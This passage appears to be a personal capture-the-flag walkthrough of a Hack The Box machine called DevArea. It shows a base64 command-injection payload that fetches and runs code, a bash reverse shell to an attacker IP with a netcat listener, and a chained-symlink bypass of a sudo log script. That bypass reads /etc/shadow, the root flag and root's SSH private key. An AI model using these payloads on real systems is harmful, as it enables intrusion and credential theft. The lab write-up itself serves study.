8.service=ssh|Y3VybCBodHRwOi8vMTAuMTAuMTUuNjEK | base64 -d | bash
```
# Shell as syswatch
![[burpsuite_syswatch_hex_encoded_payload_htb_devarea_07_10_2026.png]]
1. The original hex encoded payload does work. I had to retry it a few times and then I think I made the server crash. So I had to redo the box all over again.
2. IPPSEC used `service=a|echo -n ....`. Which also works. He replaced the valid command `ssh` with the letter `a` and that allowed him to get a shell, but If you try it the first time and only send it once you should be able to get a shell. `servic=shell|echo -n ...` can crash the server if you keep sending the command before it has time to reset. The reason behind it IPPSEC explains in timestamp 48:40.
3. Original encoded payload = `ᐅ echo 'bash -i >& /dev/tcp/10.10.15.63/443 0>&1' | xxd -p -c0`
```Bash
1. ᐅ sudo nc -nlvp 443
[sudo] password for scottx0beam:
Listening on 0.0.0.0 443
Connection received on 10.129.54.78 60064
bash: cannot set terminal process group (1469): Inappropriate ioctl for device
bash: no job control in this shell
syswatch@devarea:~/syswatch_gui$ whoami
whoami
syswatch
syswatch@devarea:~/syswatch_gui$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
syswatch@devarea:~/syswatch_gui$ ^Z
[1]  + 106813 suspended  sudo nc -nlvp 443
~/hax4crack/devarea ᐅ stty raw -echo; fg
[1]  + 106813 continued  sudo nc -nlvp 443
                                          reset xterm
syswatch@devarea:~/syswatch_gui$ export TERM=xterm-256color
syswatch@devarea:~/syswatch_gui$ source /etc/skel/.bashrc
syswatch@devarea:~/syswatch_gui$ stty rows 40 columns 187
syswatch@devarea:~/syswatch_gui$ export SHELL=/bin/bash
syswatch@devarea:~/syswatch_gui$ tty
/dev/pts/2
syswatch@devarea:~/syswatch_gui$ echo $SHELL
/bin/bash
syswatch@devarea:~/syswatch_gui$ echo $TERM
xterm-256color
syswatch@devarea:~/syswatch_gui$ hostname -I
10.129.54.78
syswatch@devarea:~/syswatch_gui$ sudo -l
[sudo] password for syswatch:
sudo: a password is required

```

# Begin enumeration as syswatch
```Bash
1. syswatch@devarea:~/syswatch_gui$ cat /etc/passwd | grep syswatch
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
2. syswatch has no access to a bash shell so we cannot ssh with syswatch
3. However, now we have access to the `/opt/syswatch` directory we were not able to access before.
4. syswatch@devarea:/opt$ cd syswatch <<< We could not access this directory before even with sudo -l privs as dev_ryan
syswatch@devarea:~$ ls -lahr
total 44K
drwxr-xr-x  5 root     root     4.0K Mar 22 18:55 venv
-rwxr-xr-x  1 root     root     6.0K Dec 14  2025 syswatch.sh
drwxr-xr-x  4 root     root     4.0K Mar 22 18:55 syswatch_gui
drwxr-xr-x  2 root     root     4.0K Mar 22 18:55 plugins
-rwxr-xr-x  1 root     root      265 Dec 12  2025 monitor.sh
drwxr-xr-x  2 syswatch syswatch 4.0K Jul 11 09:14 logs
drwxr-xr-x  2 root     root     4.0K Mar 22 18:55 config
drwxr-xr-x  2 syswatch syswatch 4.0K Jul 11 09:20 backup
drwxr-xr-x  5 root     root     4.0K Mar 22 18:55 ..
drwxr-xr-x+ 8 root     root     4.0K Mar 22 18:55 .
5. syswatch@devarea:~$ cat syswatch.sh | grep RUN_AS
RUN_AS_ROOT_PLUGINS=("log_monitor.sh")
    for p in "${RUN_AS_ROOT_PLUGINS[@]}"; do
6. The only thing that is going to run as root is `log_monitor.sh`. So if we tried injecting this syswatch.sh with malicious code it would not work.
7. syswatch@devarea:~$ find / -name \*log_monitor.sh\* 2>/dev/null
/opt/syswatch/plugins/log_monitor.sh
```

# Playing with symlinks
```Bash
1. syswatch@devarea:~$ cd logs
2. syswatch@devarea:~/logs$ ln -s /etc/shadow pwn.log
3. syswatch@devarea:~/logs$ ls -la
total 116
drwxr-xr-x  2 syswatch syswatch  4096 Jul 11 10:41 .
drwxr-xr-x+ 8 root     root      4096 Mar 22 18:55 ..
-rw-r--r--  1 syswatch syswatch  1777 Jul 11 10:38 cpu-mem.log
-rw-r--r--  1 syswatch syswatch  2686 Jul 11 10:38 disk.log
-rw-r--r--  1 syswatch syswatch 82173 Jul 11 10:38 log-alerts.log
-rw-r--r--  1 syswatch syswatch  1717 Jul 11 10:38 network.log
lrwxrwxrwx  1 syswatch syswatch    11 Jul 11 10:41 pwn.log -> /etc/shadow   <<< We have created a symlink to /etc/shadow
-rw-r--r--  1 syswatch syswatch  6341 Jul 11 10:38 service.log
4. However, the symlink does not show up in the directory when running syswatch with the sudo -l priv that dev_ryan has. If I switch to dev_ryan...
5. dev_ryan@devarea:~/.ssh$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs --list
 - cpu-mem.log
 - disk.log
 - log-alerts.log
 - network.log
 - service.log
6. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs pwn.log
[Blocked unsafe symlink target]: pwn.log -> /etc/shadow                  <<< The filtering works well but we may be able to circumvent it.
7. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs foo.log
[Log file not found]: foo.log
8. We do not see pwn.log because in `syswatch.sh` which dev_ryan does not have access to but syswatch does it has a "List Mode" condition that skips the symlinks but in a insecure way. If I cat out `syswatch.sh` as syswatch you can see what I mean.
9. syswatch@devarea:~$ cat syswatch.sh | grep "LIST MODE" -A10
    # ---- LIST MODE ----
    if [ "$arg" = "--list" ] || [ "$arg" = "list" ]; then
        local found=0
        for p in "$LOG_DIR"/*.log; do
            [ -e "$p" ] || continue
            [ -L "$p" ] && continue       # skip symlinks in list
            [ -f "$p" ] || continue
            echo " - $(basename "$p")"
            found=1
        done
        [ "$found" -eq 0 ] && echo "[No logs found]"
10. Here also you can see the other conditions that are attempting to block unsafe symlinks.
syswatch@devarea:~$ cat syswatch.sh | grep "local path=" -A8
    local path="$LOG_DIR/$file"
    if [ -L "$path" ]; then
        local target
        target=$(ls -l "$path" | awk '{print $NF}')

        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
            echo "[Blocked unsafe symlink target]: $file -> $target"
            return 1
        fi
11. It is perfectly good code except for the use of `awk '{print $NF}`
12. syswatch@devarea:~/logs$ ls -l pwn.log | awk '{print $NF}'
/etc/shadow                                 <<< I do not understand why this is doing that, but if I learn I will try to explain it.
```

# Bypass blocked unsafe symlinks pointing to sensitive files
1. `pwn.log` is pointing to `/etc/shadow` and our `foo.log` which we own is pointing to `pwn.log`. This symlink vuln is so dumb but common. I think symlinks are a good thing to get good at because they can offer security by obfuscation and for the hacker as well. FYI, symlinking can be completely disabled on a Linux system, but it could cost critical functionality of a system that is why no one ever disables symlinks.
```Bash
1. syswatch@devarea:~/logs$ ln -s /etc/shadow pwn.log
2. syswatch@devarea:~/logs$ ln -s pwn.log foo.log
3. syswatch@devarea:~/logs$ rm pwn.log
4. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs foo.log
root:$y$j9T$0KQ.TnjYkG3YsYKhdzY2I.$lGbupe1hBuVMuNFnjOfL4Oo7kFUTHPv2ocodVgqmdr9:20353:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::<SNIP>
5. We can do the same exact thing and get the root flag
6. syswatch@devarea:~/logs$ ln -s /root/root.txt pwn.log
8.dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs foo.log
454773b7882040ab91744<SNIP>
```

*(image: PWN_HTB_DEVAREA_07_10_2026.png)*
# PWNED

# Beyond pwn
1. I was able to get root, but I still need to learn a-lot about symlinks. I am no where near the levels of some of these 1337 h@x0rs. If somethings went over your head you are not alone. The key is to keep on learning and growing.
```Bash
1. syswatch@devarea:~/logs$ ln -sf redirect flag.log; ln -sf /root/.ssh/authorized_keys redirect
2. syswatch@devarea:~/logs$ ls -l redirect flag.log
lrwxrwxrwx 1 syswatch syswatch  8 Jul 11 12:04 flag.log -> redirect
lrwxrwxrwx 1 syswatch syswatch 26 Jul 11 12:04 redirect -> /root/.ssh/authorized_keys
3. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs flag.log
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIALkh4a8v0TnM9hl7suGkcxxVGxKxR/1NuFu3t8mowp/ root@devarea
4. syswatch@devarea:~/logs$ ln -sf redirect flag.log; ln -sf /root/.ssh/id_ed25519 redirect
5. dev_ryan@devarea:~/.ssh$ sudo /opt/syswatch/syswatch.sh logs flag.log
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAAC.........<SNIP>........................qMKfwAAAJCpWMQqqVjE
KgAAAAtzc2gt.......................................sSsUf9Tbhbt7fJqMKfw
AAAEAgx+KGKmchYnjPrbBgHwaX9SV9+qcdc5p+kHrSVpwMMALkh4a8v0TnM9hl7suGkcxx
VGxKxR/1NuFu3t8mowp/AAAADHJvb3RAZGV2YXJlYQE=
-----END OPENSSH PRIVATE KEY-----
6. ᐅ vim id_rsa
7. ᐅ chmod 600 id_rsa
8. ᐅ ssh root@devarea.htb -i id_rsa
9. root@devarea:~# whoami
root
10. root@devarea:~# cat /etc/shadow
root:$y$j9T$0KQ.TnjYkG3YsYKhdzY2I.$lGbupe1hBuVMuNFnjOfL4Oo7kFUTHPv2ocodVgqmdr9:20353:0:99999:7:::
daemon:*:20305:0:99999:7:::
bin:*:20305:0:99999:7:::<SNIP>
```
